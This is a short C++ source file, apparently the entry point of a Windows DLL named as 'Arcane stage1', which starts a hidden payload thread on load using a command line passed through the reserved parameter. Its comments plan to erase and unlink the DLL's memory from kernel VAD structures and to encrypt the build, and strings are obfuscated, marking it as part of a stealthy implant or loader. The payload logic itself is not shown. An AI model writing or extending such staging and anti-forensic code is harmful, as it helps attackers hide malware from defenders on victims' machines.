#include "Exception.hpp"
#include "ArcaneLogic.hpp"
#include "DefinesMacros.hpp"

#include <windows.h>

BOOL WINAPI DllMain(UNUSED(HINSTANCE hinstDLL), DWORD fdwReason, LPVOID lpvReserved)
{
    // TODO: cleanup mechanism at the end of exection that use apc that iterates over vad, writes over the bytes and unlinks it from the MMVAD_ROOT
    // TODO: create compiler script that encrypts this into the out dir

    try
    {
        std::wstring command_line = reinterpret_cast<wchar_t*>(lpvReserved);

        switch (fdwReason)
        {
        case DLL_PROCESS_ATTACH:
            ArcaneLogic::run_in_thread(command_line);

            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    CATCH_ALL(OBFUSCATE("Exception caught in Arcane stage1 DLLMain!"))
}